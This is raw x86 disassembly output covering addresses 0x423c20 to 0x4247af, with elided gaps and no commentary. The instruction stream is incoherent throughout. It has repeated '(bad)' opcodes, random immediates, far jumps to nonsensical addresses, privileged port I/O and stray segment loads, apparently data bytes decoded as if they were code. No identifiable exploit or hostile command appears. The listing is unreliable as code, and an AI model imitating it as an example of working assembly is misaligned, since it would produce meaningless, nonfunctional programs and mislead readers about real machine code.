  423c20:	mov    edx,0xb248f679
  423c25:	inc    edi
  423c26:	and    DWORD PTR [esi-0x5373c475],edx
  423c2c:	lods   al,BYTE PTR ds:[esi]
  423c2d:	jle    0x423cab
  423c2f:	test   eax,0xd167526a
  423c34:	call   0xbfee55b
  423c39:	pop    es
  423c3a:	xchg   ecx,eax
  423c3b:	cdq    
  423c3c:	adc    BYTE PTR [ebp-0x20],dl
  423c3f:	adc    eax,0x31
	...
  423cb4:	mov    edi,0x626d60bd
  423cb9:	std    
  423cba:	mov    edi,0x703576ff
  423cbf:	enter  0x2353,0xf2
  423cc3:	mov    ebp,0x17db7
  423cc8:	cmc    
  423cc9:	add    BYTE PTR [eax],al
  423ccb:	add    BYTE PTR ds:0x45c4899c,al
  423cd1:	xor    cl,0x3d
  423cd4:	test   eax,ecx
  423cd6:	lea    edx,ds:0x9f0eee28
  423cdc:	aad    0x5
  423cde:	sbb    ch,BYTE PTR [esi-0x6e21bbab]
  423ce4:	(bad)  
  423ce5:	sti    
  423ce6:	inc    ecx
  423ce7:	sbb    eax,0xe2f8a596
  423cec:	scas   eax,DWORD PTR es:[edi]
  423ced:	nop
  423cee:	push   ebp
  423cef:	adc    eax,0x8a669525
  423cf4:	push   edx
  423cf5:	mov    ds:0xb4adc89b,al
  423cfa:	jmp    0x71c8aed2
  423cff:	pop    edi
  423d00:	fmul   st,st(2)
  423d02:	mov    bl,0xf4
  423d04:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  423d06:	sub    BYTE PTR [edx+0x34f45656],0x39
  423d0d:	xchg   DWORD PTR [eax+esi*2],ecx
  423d10:	jnp    0x423d2a
  423d12:	add    DWORD PTR [edx+esi*1+0x64049286],esi
  423d19:	sbb    edx,edi
  423d1b:	daa    
  423d1c:	sub    eax,0xe144556d
  423d21:	fwait
  423d22:	test   edx,0xa6b54569
  423d28:	mov    eax,DWORD PTR fs:[ecx]
  423d2b:	jmp    0xf9c41959
  423d30:	(bad)  
  423d31:	sti    
  423d32:	mov    al,ds:0xaabc37e1
  423d37:	inc    edi
  423d38:	dec    eax
  423d39:	push   0xffffff91
  423d3b:	shr    BYTE PTR [ebp+0x4e],1
  423d3e:	and    ecx,DWORD PTR [esi+0xc]
  423d41:	jo     0x423cee
  423d43:	jl     0x423d70
  423d45:	inc    esi
  423d46:	cmp    al,0xa4
  423d48:	push   edi
  423d49:	sub    DWORD PTR [ecx+0x3585f248],0xffffff80
  423d50:	fnsave [eax+esi*4-0x71270cc6]
  423d57:	pusha  
  423d58:	add    al,0xe5
  423d5a:	fnstsw WORD PTR [ecx+0xca8cf43]
  423d60:	pop    esp
  423d61:	into   
  423d62:	test   DWORD PTR [ebp+0x2fd520d9],0xf3934d70
  423d6c:	je     0x423d94
  423d6e:	cmp    cl,BYTE PTR [ecx+0x6b]
  423d71:	shl    DWORD PTR [ecx+0x7a9a077f],cl
  423d77:	loop   0x423dd8
  423d79:	mov    ebp,eax
  423d7b:	fwait
  423d7c:	mov    edi,0xc9a2223d
  423d81:	jg     0x423da9
  423d83:	test   DWORD PTR [edx+ebp*8+0x66],esi
  423d87:	adc    al,0x7f
  423d89:	pop    ebp
  423d8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d8b:	ds push edx
  423d8d:	mov    edx,0xcef32cc5
  423d92:	scas   al,BYTE PTR es:[edi]
  423d93:	xor    ebx,DWORD PTR [esi]
  423d95:	add    edi,DWORD PTR [ebx-0x1]
  423d98:	(bad)  
  423d99:	jmp    0x592d87d1
  423d9e:	popa   
  423d9f:	inc    ebp
  423da0:	pop    ds
  423da1:	nop
  423da2:	jno    0x423d33
  423da4:	inc    ebx
  423da5:	or     cl,cl
  423da7:	mov    al,0x74
  423da9:	imul   esp,DWORD PTR [ebx-0x1e4261d6],0x8dde5c76
  423db3:	ja     0x423e1b
  423db5:	mov    al,ds:0x71d2ec2a
  423dba:	mov    bl,0x47
  423dbc:	ja     0x423e28
  423dbe:	mov    cl,0x3d
  423dc0:	mov    cl,0x0
	...
  423e32:	add    BYTE PTR [eax],al
  423e34:	adc    DWORD PTR [ebp-0x78],0x19
  423e38:	(bad)  
  423e3a:	xchg   ebx,eax
  423e3b:	ffreep st(6)
  423e3d:	dec    eax
  423e3e:	imul   ebp,edi,0xffffff9b
  423e41:	outs   dx,DWORD PTR ds:[esi]
  423e42:	sub    al,bl
  423e44:	lods   al,BYTE PTR ds:[esi]
  423e45:	jle    0x423e48
  423e47:	add    ch,dh
  423e49:	add    BYTE PTR [eax],al
  423e4b:	add    BYTE PTR [edi],dh
  423e4d:	mov    WORD PTR [ebx],gs
  423e4f:	jno    0x423e0c
  423e51:	or     bh,cl
  423e53:	arpl   WORD PTR [ecx+0x4735239a],bp
  423e59:	js     0x423eac
  423e5b:	nop
  423e5c:	pop    esi
  423e5d:	or     ch,BYTE PTR [ebp-0x16]
  423e60:	aam    0x52
  423e62:	inc    edi
  423e63:	mov    BYTE PTR ss:[ecx+0x2eb5cf16],ah
  423e6a:	popf   
  423e6b:	(bad)
  423e6f:	mov    ah,ah
  423e71:	inc    edi
  423e72:	sbb    DWORD PTR [ebx],ebp
  423e74:	push   es
  423e75:	aas    
  423e76:	imul   edi,ebx,0x18
  423e79:	hlt    
  423e7a:	test   eax,0xfbb63ab7
  423e7f:	popf   
  423e80:	aaa    
  423e81:	inc    esp
  423e82:	scas   eax,DWORD PTR es:[edi]
  423e83:	fnsave [edx]
  423e85:	js     0x423f00
  423e87:	xor    ebp,DWORD PTR [eax]
  423e89:	je     0x423e46
  423e8b:	div    DWORD PTR [edx+0x23]
  423e8e:	or     ah,BYTE PTR [ebp-0x16]
  423e91:	jl     0x423e9c
  423e93:	push   ss
  423e94:	popw   ss
  423e96:	das    
  423e97:	cwde   
  423e98:	dec    ecx
  423e99:	int    0xe9
  423e9b:	cdq    
  423e9c:	lahf   
  423e9d:	aam    0x4
  423e9f:	mov    ds:0xfc88a495,al
  423ea4:	xor    ebx,ebp
  423ea6:	inc    edi
  423ea7:	test   DWORD PTR [ebp-0x80],edi
  423eaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423eab:	mov    ecx,0x4a4e3e54
  423eb0:	hlt    
  423eb1:	daa    
  423eb2:	xor    ecx,eax
  423eb4:	jo     0x423e5f
  423eb6:	aad    0xe4
  423eb8:	inc    BYTE PTR [edi+edx*2]
  423ebb:	push   eax
  423ebc:	jg     0x423f3a
  423ebe:	pop    ds
  423ebf:	mov    ebx,0xb4617550
  423ec4:	mov    ah,BYTE PTR [esi-0x464b011e]
  423eca:	in     al,0xfe
  423ecc:	scas   eax,DWORD PTR es:[edi]
  423ecd:	ds dec ebx
  423ecf:	xchg   ebx,eax
  423ed0:	mov    ds,ebp
  423ed2:	adc    eax,0xaa585d53
  423ed7:	lods   eax,DWORD PTR ds:[esi]
  423ed8:	std    
  423ed9:	in     eax,0xe8
  423edb:	ins    BYTE PTR es:[edi],dx
  423edc:	mov    bh,0x7e
  423ede:	and    edi,DWORD PTR [ebx+0xda7e5b0]
  423ee4:	out    dx,al
  423ee5:	sub    ebx,0x77
  423ee8:	mov    dl,0xda
  423eea:	lock cs xor eax,0x5c67d38a
  423ef1:	ss ret 0xe82b
  423ef5:	clc    
  423ef6:	mov    al,0xf7
  423ef8:	cs idiv al
  423efb:	loop   0x423e85
  423efd:	lods   al,BYTE PTR ds:[esi]
  423efe:	inc    esp
  423eff:	ss adc eax,0xecafd6b6
  423f05:	sub    BYTE PTR [edx+0x51e2785a],bl
  423f0b:	or     al,0x95
  423f0d:	mov    DWORD PTR [edi-0x1b],edi
  423f10:	loope  0x423f20
  423f12:	sub    eax,0x5bcee277
  423f17:	ss cmc 
  423f19:	mov    cl,0xe3
  423f1b:	shr    DWORD PTR [ebx-0x24],0x3e
  423f1f:	cmp    bl,ah
  423f21:	ja     0x423f62
  423f23:	adc    eax,0x3aaee27
  423f28:	jg     0x423f5c
  423f2a:	ss leave 
  423f2c:	retf   0x958f
  423f2f:	out    dx,al
  423f30:	mov    eax,ds:0xa0ee094b
  423f35:	add    esi,DWORD PTR [ebp+0x5d]
  423f38:	das    
  423f39:	pop    esi
  423f3a:	ss mov ebp,ecx
  423f3d:	add    edx,DWORD PTR [edx]
  423f3f:	xchg   ebx,eax
  423f40:	add    eax,DWORD PTR [eax]
	...
  423fb2:	add    BYTE PTR [eax],al
  423fb4:	inc    esi
  423fb5:	in     al,0x62
  423fb7:	mov    dl,ah
  423fb9:	mov    gs,esi
  423fbb:	out    dx,al
  423fbc:	in     al,dx
  423fbd:	pop    ebx
  423fbe:	test   BYTE PTR [edx+0x6],dh
  423fc1:	les    ebp,FWORD PTR [ebp+0x17fa1d2]
  423fc7:	add    ch,dh
  423fc9:	add    BYTE PTR [eax],al
  423fcb:	add    ch,dh
  423fcd:	adc    al,BYTE PTR [edi+0x77]
  423fd0:	jb     0x423f74
  423fd2:	not    BYTE PTR [ebp-0x155f6a88]
  423fd8:	jecxz  0x42400a
  423fda:	adc    edx,esp
  423fdc:	test   BYTE PTR [ebx],0xa6
  423fdf:	pop    edi
  423fe0:	mov    ah,ah
  423fe2:	in     eax,0xe9
  423fe4:	mov    eax,0xedb732df
  423fe9:	inc    esp
  423fea:	xor    DWORD PTR [ebx-0x2d2e82bf],ecx
  423ff0:	dec    eax
  423ff1:	mov    ebp,0xf396d5db
  423ff6:	stos   DWORD PTR es:[edi],eax
  423ff7:	out    dx,al
  423ff8:	stc    
  423ff9:	stos   DWORD PTR es:[edi],eax
  423ffa:	sub    DWORD PTR [ebp+0x3e],0x9a06b5d3
  424001:	mov    eax,0x4c92b7fe
  424006:	sub    eax,0x861e8ea9
  42400b:	adc    ebx,ecx
  42400d:	add    dh,BYTE PTR [edx+0x43]
  424010:	vpsubb zmm4{k2}{z},zmm0,zmm5
  424016:	jbe    0x424089
  424018:	mov    bl,0xd8
  42401a:	cmp    esp,DWORD PTR [edx+0x60a5c8db]
  424020:	fs dec ebp
  424022:	stos   BYTE PTR es:[edi],al
  424023:	xchg   edx,eax
  424024:	out    0xbf,al
  424026:	jmp    0x423fb4
  424028:	imul   edi,esi,0xffffffed
  42402b:	inc    edx
  42402c:	inc    ebx
  42402d:	mov    dl,0xd1
  42402f:	mov    ah,0xfd
  424031:	xlat   BYTE PTR ds:[ebx]
  424032:	sub    DWORD PTR [ebp-0x4069cc31],esi
  424038:	or     DWORD PTR [ecx-0x65],ebp
  42403b:	jno    0x424000
  42403d:	fild   WORD PTR [eax+0x31]
  424040:	test   BYTE PTR [esi],ah
  424042:	clc    
  424043:	xor    eax,0xcfef116
  424048:	sbb    DWORD PTR [ebx-0x1b],edx
  42404b:	popf   
  42404c:	ins    DWORD PTR es:[edi],dx
  42404d:	sub    ebp,ebp
  42404f:	jle    0x424083
  424051:	cdq    
  424052:	mov    esp,0x767d71e0
  424057:	iret   
  424058:	xchg   edx,eax
  424059:	dec    eax
  42405a:	loop   0x424053
  42405c:	add    al,0xed
  42405e:	sbb    ebx,DWORD PTR [ecx+0x2843b49]
  424064:	dec    edx
  424065:	int3   
  424066:	sti    
  424067:	fimul  WORD PTR [edx-0x63dc57db]
  42406d:	push   esp
  42406e:	cmp    DWORD PTR [ebx-0x7e],0x79
  424072:	fs mov ch,0x9d
  424075:	inc    esp
  424076:	jmp    0x5fd8:0x387b7189
  42407d:	jbe    0x4240fa
  42407f:	jmp    0x743697b4
  424084:	sub    eax,0xc2f7d002
  424089:	inc    esi
  42408a:	imul   ebp,DWORD PTR [ecx+0x60],0xac3454ff
  424091:	ret    
  424092:	and    edx,DWORD PTR [eax+0x6e]
  424095:	lea    esi,[ecx-0x62]
  424098:	idiv   BYTE PTR [ebp+esi*2-0x71]
  42409c:	push   0xffffff86
  42409e:	repnz aam 0x91
  4240a1:	mov    ecx,0xb5252eb3
  4240a6:	dec    eax
  4240a7:	pop    ecx
  4240a8:	mov    bl,0x50
  4240aa:	pop    ebp
  4240ab:	add    eax,0x95f7c7cf
  4240b0:	push   ebp
  4240b1:	retf   0xb811
  4240b4:	mov    WORD PTR [eax],ss
  4240b6:	sti    
  4240b7:	pop    esp
  4240b8:	jmp    0x6ca7f783
  4240bd:	pop    edi
  4240be:	inc    eax
  4240bf:	call   0x424121
	...
  424134:	jns    0x424127
  424136:	div    DWORD PTR [ecx-0x6804801]
  42413c:	bound  esi,QWORD PTR [eax-0x14c58496]
  424142:	or     BYTE PTR [ebx],0x96
  424145:	add    BYTE PTR [ecx],0x0
  424148:	cmc    
  424149:	add    BYTE PTR [eax],al
  42414b:	add    BYTE PTR [edi+0x6],dh
  42414e:	push   ecx
  42414f:	mov    ds:0x866f3ee3,eax
  424154:	out    dx,al
  424155:	adc    al,0x41
  424157:	sar    DWORD PTR [eax],0x4a
  42415a:	lahf   
  42415b:	cmp    al,0x73
  42415d:	or     esi,edi
  42415f:	cmp    ch,ah
  424161:	add    al,0xe0
  424163:	push   ss
  424164:	and    cl,BYTE PTR [ebp+0x53c4b74f]
  42416a:	or     DWORD PTR [eax-0x29],ebp
  42416d:	fsubp  st(1),st
  42416f:	xchg   ebp,eax
  424170:	xchg   esi,eax
  424171:	(bad)  
  424172:	(bad)  [edx-0x26fbcc41]
  424178:	cmp    dl,0x28
  42417b:	cli    
  42417c:	sahf   
  42417d:	scas   eax,DWORD PTR es:[edi]
  42417e:	sbb    eax,0x5b08c527
  424183:	or     ch,ch
  424185:	mov    dl,0x6c
  424187:	in     al,dx
  424188:	sbb    BYTE PTR [ebx+0x6a85e87e],bl
  42418e:	push   cs
  42418f:	pushf  
  424190:	(bad)  
  424193:	mov    ds:0xb236a080,al
  424198:	(bad)  
  424199:	push   ebp
  42419a:	clc    
  42419b:	sbb    eax,0x6e5b3a27
  4241a0:	cmp    al,0x99
  4241a2:	pop    ebp
  4241a3:	push   0x38
  4241a5:	int3   
  4241a6:	rol    DWORD PTR [esi],1
  4241a8:	ret    0x3004
  4241ab:	cmp    DWORD PTR [ecx],edi
  4241ad:	das    
  4241ae:	xchg   esp,eax
  4241af:	mov    eax,0x4ac23d5b
  4241b4:	sub    eax,0x8c674583
  4241b9:	fiadd  WORD PTR [esi+0x2fed4670]
  4241bf:	ins    BYTE PTR es:[edi],dx
  4241c0:	fwait
  4241c1:	sti    
  4241c2:	adc    bl,cl
  4241c4:	or     ebp,DWORD PTR [edx+0x27673150]
  4241ca:	pop    ecx
  4241cb:	push   ecx
  4241cc:	inc    esi
  4241cd:	shl    ecx,cl
  4241cf:	mov    DWORD PTR [edi-0x1e],edx
  4241d2:	sub    DWORD PTR [ebx+0x6b],edx
  4241d5:	xor    DWORD PTR [ebx-0x4c722207],ebx
  4241db:	xchg   edi,eax
  4241dc:	mov    DWORD PTR [ebx],ebp
  4241de:	mov    ebp,0xe7bd24b1
  4241e3:	cld    
  4241e4:	adc    BYTE PTR [esi],ah
  4241e6:	xchg   cl,dh
  4241e8:	mov    ebp,0x1e66e6f2
  4241ed:	stos   DWORD PTR es:[edi],eax
  4241ee:	fild   WORD PTR [eax]
  4241f0:	imul   edi,DWORD PTR [ecx-0x572b0e41],0xc0bb04e6
  4241fa:	xchg   ecx,eax
  4241fb:	push   ss
  4241fc:	cwde   
  4241fd:	mov    ah,0x38
  4241ff:	add    ebp,DWORD PTR [edi-0x2f6bbd41]
  424205:	xchg   ecx,eax
  424206:	imul   ebp,esp,0x35788a6
  42420c:	lds    si,DWORD PTR [edx+0x5dc547c3]
  424213:	mov    al,ds:0xfe696ac9
  424218:	mov    al,0xda
  42421a:	in     eax,dx
  42421b:	addr16 pop ebp
  42421d:	(bad)  
  42421f:	and    BYTE PTR [edx-0x3],bh
  424222:	mov    ch,0xc4
  424224:	mov    al,ds:0x9fb6267c
  424229:	inc    ecx
  42422a:	leave  
  42422b:	or     eax,0xd86564b5
  424230:	jbe    0x42427d
  424232:	jmp    0xe262:0x3166fbe9
  424239:	inc    edi
  42423a:	xor    ebp,DWORD PTR [esi-0x517aa34b]
  424240:	repnz add BYTE PTR [eax],al
	...
  4242b3:	add    al,bh
  4242b5:	fisub  WORD PTR [edx+0x30]
  4242b8:	mov    sp,0xdefa
  4242bc:	push   ss
  4242bd:	mov    ds:0x32bda4bf,eax
  4242c2:	and    cl,BYTE PTR [edi]
  4242c4:	mov    eax,DWORD PTR [ecx+0xf50001]
  4242ca:	add    BYTE PTR [eax],al
  4242cc:	mov    ch,0x5f
  4242ce:	(bad)  
  4242cf:	int    0x7c
  4242d1:	test   DWORD PTR [edi-0x433309f8],eax
  4242d7:	pushf  
  4242d8:	cmp    al,0x9e
  4242da:	int    0x9e
  4242dc:	mov    ecx,0x31789720
  4242e1:	cwde   
  4242e2:	xchg   edi,eax
  4242e3:	push   ds
  4242e4:	test   ecx,ecx
  4242e6:	mov    dl,BYTE PTR [edx+0x64c4e9d4]
  4242ec:	add    ah,BYTE PTR [ecx+0x5c]
  4242ef:	dec    edx
  4242f0:	pop    ebp
  4242f1:	add    eax,0xa796c5fa
  4242f6:	ins    BYTE PTR es:[edi],dx
  4242f7:	lds    esp,FWORD PTR [edx]
  4242f9:	dec    ecx
  4242fa:	add    eax,0x5509ede9
  4242ff:	dec    edx
  424300:	jnp    0x42429c
  424302:	mov    ebp,0x10f4e7c
  424307:	xchg   ecx,eax
  424308:	fwait
  424309:	in     al,0x10
  42430b:	xchg   esi,eax
  42430c:	push   0x6e
  42430e:	adc    ebp,DWORD PTR [eax-0x6]
  424311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424312:	mov    ecx,0xb11090ab
  424317:	ret    
  424318:	mov    DWORD PTR [edx+0x2a57fa9b],ecx
  42431e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42431f:	popf   
  424320:	xlat   BYTE PTR ds:[ebx]
  424321:	mov    ah,BYTE PTR [edi*8-0x5ffe8dc4]
  424328:	frstor [edx-0x343e0cb4]
  42432e:	dec    eax
  42432f:	and    BYTE PTR [eax+0x2edd14f2],al
  424335:	fcomp  st(7)
  424337:	jge    0x42436a
  424339:	push   ebx
  42433a:	in     al,0x16
  42433c:	sub    BYTE PTR [ebx-0x5178624c],al
  424342:	or     eax,0x79ecccfa
  424347:	jnp    0x4242fb
  424349:	push   ds
  42434a:	pusha  
  42434b:	loopne 0x424347
  42434d:	mov    al,ds:0x7f1261e7
  424352:	fld    QWORD PTR [ecx+0x11bf76a3]
  424358:	fdivr  st(3),st
  42435a:	sub    edx,0xc4293ee8
  424360:	stos   DWORD PTR es:[edi],eax
  424361:	xchg   DWORD PTR [eax-0x53],ebx
  424364:	(bad)  
  424366:	inc    edx
  424367:	add    al,0x18
  42436a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42436b:	std    
  42436c:	loope  0x4243c4
  42436e:	stos   DWORD PTR es:[edi],eax
  42436f:	std    
  424370:	or     eax,0x939c283
  424375:	pusha  
  424376:	push   es
  424377:	rol    ebx,0x62
  42437a:	inc    esi
  42437b:	test   esi,eax
  42437d:	repz mov esi,0xf0c80f4c
  424383:	imul   ecx,eax,0x72
  424386:	mov    ecx,DWORD PTR [edi]
  424388:	add    eax,0x5a0e6ba0
  42438d:	sbb    al,0xf5
  42438f:	cmp    ecx,DWORD PTR [ebp+0x4b57563e]
  424395:	in     al,0xec
  424397:	ret    
  424398:	push   ebx
  424399:	mov    edx,0x12091770
  42439e:	cmp    BYTE PTR [eax-0x47],dh
  4243a1:	adc    eax,0xb763c5be
  4243a6:	push   es
  4243a7:	nop
  4243a8:	jno    0x4243d9
  4243aa:	addr16 inc edx
  4243ac:	loopne 0x42435a
  4243ae:	stos   BYTE PTR es:[edi],al
  4243af:	loope  0x424420
  4243b1:	in     al,0x98
  4243b3:	ror    esi,1
  4243b5:	and    dh,al
  4243b7:	mov    al,0xb3
  4243b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243ba:	jg     0x4243f7
  4243bc:	mov    bl,0xa7
  4243be:	out    dx,al
  4243bf:	push   ss
  4243c0:	das    
	...
  424431:	add    BYTE PTR [eax],al
  424433:	add    al,al
  424435:	mov    al,0x45
  424437:	outs   dx,DWORD PTR ds:[esi]
  424438:	jne    0x424439
  42443a:	jmp    0xb9d2:0x8abb70bf
  424441:	sbb    DWORD PTR [ecx+0x1828084],0x0
  424448:	cmc    
  424449:	add    BYTE PTR [eax],al
  42444b:	add    BYTE PTR [eax+eiz*8-0x2a],ch
  42444f:	mov    cl,BYTE PTR [ebp-0x59]
  424452:	xlat   BYTE PTR ds:[ebx]
  424453:	jl     0x424438
  424455:	and    ah,BYTE PTR [esi+0x25c845e3]
  42445b:	popa   
  42445c:	jno    0x424419
  42445e:	addr16 pop ebx
  424460:	add    DWORD PTR [ecx-0x2d4077ae],ebx
  424466:	and    DWORD PTR [esi-0x3bf7f471],edi
  42446c:	inc    ebx
  42446d:	(bad)  
  42446e:	xchg   edx,eax
  42446f:	jns    0x424440
  424471:	cdq    
  424472:	repz mov ds:0xb4dcbef4,al
  424478:	push   ss
  424479:	or     dh,bh
  42447b:	fcmovnb st,st(7)
  42447d:	sub    edi,DWORD PTR [esp+ebx*8-0x2b072c1b]
  424484:	mov    eax,0xb2a9a504
  424489:	loope  0x424427
  42448b:	out    dx,al
  42448c:	ror    edx,0x3
  42448f:	sbb    bl,BYTE PTR [ebp+0x3b]
  424492:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424493:	lea    ebp,[ebx+0x35]
  424496:	and    eax,DWORD PTR [eax]
  424498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424499:	inc    esp
  42449a:	sbb    eax,0x1522e5ab
  42449f:	mov    BYTE PTR [ebx],al
  4244a1:	retf   0xfcf6
  4244a4:	ror    BYTE PTR [edi],0xee
  4244a7:	jg     0x42447f
  4244a9:	push   ecx
  4244aa:	xor    eax,0x86374349
  4244af:	push   esi
  4244b0:	arpl   WORD PTR [ebx-0x1f],bp
  4244b3:	leave  
  4244b4:	(bad)  
  4244b5:	mov    ecx,0x9b453920
  4244ba:	popf   
  4244bb:	leave  
  4244bc:	ret    0x288d
  4244bf:	sbb    dl,BYTE PTR [eax-0x7c]
  4244c2:	adc    al,0xf4
  4244c4:	sbb    DWORD PTR [edx],ebp
  4244c6:	xor    al,0x75
  4244c8:	fnstcw WORD PTR ds:0xf6cbb8b1
  4244ce:	and    dl,BYTE PTR [edx-0x2be87f4e]
  4244d4:	ins    BYTE PTR es:[edi],dx
  4244d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244d6:	or     dh,BYTE PTR [ebx]
  4244d8:	inc    edx
  4244d9:	(bad)  
  4244da:	push   ebx
  4244db:	pop    ss
  4244dc:	gs aas 
  4244de:	lahf   
  4244df:	and    ecx,edi
  4244e1:	xor    al,0xa
  4244e3:	loope  0x4244fa
  4244e5:	push   ss
  4244e6:	mov    BYTE PTR [edx+ebx*8],bh
  4244e9:	jge    0x424490
  4244eb:	cld    
  4244ec:	inc    eax
  4244ed:	mul    DWORD PTR [edi-0x10d7b18e]
  4244f3:	pop    esp
  4244f4:	mov    dl,BYTE PTR [esi+edx*1+0x22cca9de]
  4244fb:	(bad)  
  4244fc:	test   eax,0x1a87248f
  424501:	call   0x5318bc66
  424506:	jl     0x4244a9
  424508:	test   BYTE PTR [ebx+0x19],dh
  42450b:	pusha  
  42450c:	addr16 std 
  42450e:	and    al,BYTE PTR [esi+0x23f6bf97]
  424514:	mov    ebx,ebx
  424516:	mov    dh,0xb1
  424518:	loopne 0x424554
  42451a:	arpl   cx,cx
  42451c:	popa   
  42451d:	sti    
  42451e:	(bad)  
  42451f:	iret   
  424520:	ja     0x42457f
  424522:	sbb    eax,0x8873618c
  424527:	(bad)  
  424528:	int    0xf4
  42452a:	mov    ah,0xb
  42452c:	leave  
  42452d:	jns    0x4245a1
  42452f:	xchg   edi,eax
  424530:	mov    cl,0xfa
  424532:	fwait
  424533:	pop    ecx
  424534:	jo     0x424508
  424536:	mov    dh,0xb7
  424538:	push   ebx
  424539:	cmp    eax,0x5b167a00
  42453e:	jg     0x424583
  424540:	mov    al,0x0
	...
  4245b2:	add    BYTE PTR [eax],al
  4245b4:	or     BYTE PTR [edi-0x8808b84],0x88
  4245bb:	(bad)  
  4245bc:	jle    0x424610
  4245be:	ins    BYTE PTR es:[edi],dx
  4245bf:	xor    ecx,eax
  4245c1:	or     al,0x6
  4245c3:	inc    esi
  4245c4:	jne    0x424549
  4245c6:	add    DWORD PTR [eax],eax
  4245c8:	cmc    
  4245c9:	add    BYTE PTR [eax],al
  4245cb:	add    BYTE PTR [ecx+ebx*4-0x2bea7086],ch
  4245d2:	add    eax,0x8514e5d
  4245d7:	(bad)  [edi-0x6d03db5b]
  4245dd:	mov    ds:0xdac43d7e,al
  4245e2:	dec    edx
  4245e3:	jb     0x424660
  4245e5:	push   es
  4245e6:	mov    cl,BYTE PTR [eax]
  4245e8:	mov    ds:0x8099fc30,eax
  4245ed:	mov    dl,0x95
  4245ef:	and    al,0x22
  4245f1:	jg     0x424602
  4245f3:	sub    ah,BYTE PTR [edi+0x775d13bc]
  4245f9:	xor    dh,BYTE PTR [edi-0x8dae4d6]
  4245ff:	or     esp,DWORD PTR [ebp-0x203c3cf1]
  424605:	pop    ecx
  424606:	dec    ecx
  424607:	adc    bl,BYTE PTR [ebx]
  424609:	nop
  42460a:	push   ebp
  42460b:	and    dl,al
  42460d:	in     al,0xc0
  42460f:	dec    edx
  424610:	and    al,0xf1
  424612:	loopne 0x4245e5
  424614:	pop    ebp
  424615:	sti    
  424616:	ficom  DWORD PTR [edi]
  424618:	pop    ebp
  424619:	dec    ebx
  42461a:	std    
  42461b:	xor    eax,edi
  42461d:	sbb    eax,0x47fb0d28
  424622:	mov    edi,0x23fcb240
  424627:	bound  edx,QWORD PTR [edx+esi*1+0x43]
  42462b:	xor    eax,0xc6c6f828
  424630:	lods   al,BYTE PTR ds:[esi]
  424631:	jg     0x4245d3
  424633:	jp     0x4245b7
  424635:	mov    cl,0x5d
  424637:	call   0x32577294
  42463c:	imul   esp,DWORD PTR [ebp+0x5dea4e2e],0xffffffc7
  424643:	cmp    BYTE PTR [ebp+edi*8-0x543c7d19],cl
  42464a:	sub    ebx,DWORD PTR [ebp+0x36]
  42464d:	xchg   esp,eax
  42464e:	xor    eax,edx
  424650:	test   DWORD PTR [edx-0x77a931d9],0x8d1ffcd5
  42465a:	jmp    0x3bd9d76e
  42465f:	sub    BYTE PTR [edi],ah
  424661:	ret    0xe947
  424664:	push   0x74f4eb02
  424669:	mov    ch,0xde
  42466b:	jns    0x4246b2
  42466d:	xchg   edi,eax
  42466e:	ret    0x2cf2
  424671:	or     BYTE PTR [ebp-0x58],bl
  424674:	ror    BYTE PTR [ecx],1
  424676:	gs cmc 
  424678:	sub    dl,al
  42467a:	imul   esp,DWORD PTR [ebx+0x5f],0xffffff83
  42467e:	and    DWORD PTR [edx+0x3cd616ea],0xb7ab90ee
  424688:	popa   
  424689:	repz mov ebp,0x9f742992
  42468f:	pop    es
  424690:	popf   
  424691:	pop    ebx
  424692:	scas   eax,DWORD PTR es:[edi]
  424693:	mov    dh,0xf0
  424695:	mov    eax,0x844f67a3
  42469a:	pop    edi
  42469b:	loopne 0x4246fb
  42469d:	mov    ds:0x1f915330,eax
  4246a2:	lea    esp,[edx-0x4c]
  4246a5:	addr16 aas 
  4246a7:	inc    edx
  4246a8:	dec    esp
  4246a9:	ja     0x424657
  4246ab:	fistp  DWORD PTR [eax-0x388fe857]
  4246b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246b2:	cmc    
  4246b3:	sti    
  4246b4:	out    dx,eax
  4246b5:	pop    ss
  4246b6:	or     cl,BYTE PTR [ebx]
  4246b8:	mov    cs,WORD PTR [ebx]
  4246ba:	inc    esp
  4246bb:	repnz xor BYTE PTR ds:0x3a9dc6,bl
	...
  424732:	add    BYTE PTR [eax],al
  424734:	xor    al,0x23
  424736:	jo     0x4246d5
  424738:	ja     0x424719
  42473a:	std    
  42473b:	stos   DWORD PTR es:[edi],eax
  42473c:	lods   eax,DWORD PTR ds:[esi]
  42473d:	and    ebp,esi
  42473f:	fucom  st(5)
  424741:	in     al,dx
  424742:	mov    cl,0x55
  424744:	push   0xffffff84
  424746:	add    DWORD PTR [eax],eax
  424748:	cmc    
  424749:	add    BYTE PTR [eax],al
  42474b:	add    BYTE PTR [edi],bl
  42474d:	mov    bh,0x3c
  42474f:	imul   esp,DWORD PTR [esi],0x438dd4e7
  424755:	bound  eax,QWORD PTR [edi+0x4]
  424758:	xor    BYTE PTR [edi+edi*2+0x1a],dl
  42475c:	ret    0x7e6f
  42475f:	pop    eax
  424760:	push   0x46ef6495
  424765:	ds clc 
  424767:	repz mov al,ds:0x15c6afdf
  42476d:	xchg   ebx,eax
  42476e:	inc    ebp
  42476f:	sub    BYTE PTR [ebx+0x26b54d30],dh
  424775:	ins    DWORD PTR es:[edi],dx
  424776:	(bad)  
  424777:	jbe    0x42473f
  424779:	jmp    0x4a7d:0x3bc23775
  424780:	inc    esi
  424781:	fcomi  st,st(3)
  424783:	and    dl,BYTE PTR [ecx+ebx*8+0x286b153b]
  42478a:	adc    BYTE PTR [edi-0x7f],bl
  42478d:	mov    dh,0xdb
  42478f:	bound  esi,QWORD PTR [edi+0xb]
  424792:	add    DWORD PTR [ecx+0x62de29b6],0xffffffc2
  424799:	ror    DWORD PTR [ecx-0x17099d51],0x80
  4247a0:	pop    eax
  4247a1:	sbb    DWORD PTR [edx+0x654d0cd5],ebp
  4247a7:	add    ah,BYTE PTR [ebx+0x3c]
  4247aa:	gs and al,0x4c
  4247ad:	pusha  
  4247ae:	std    
  4247af:	xchg   esp,eax
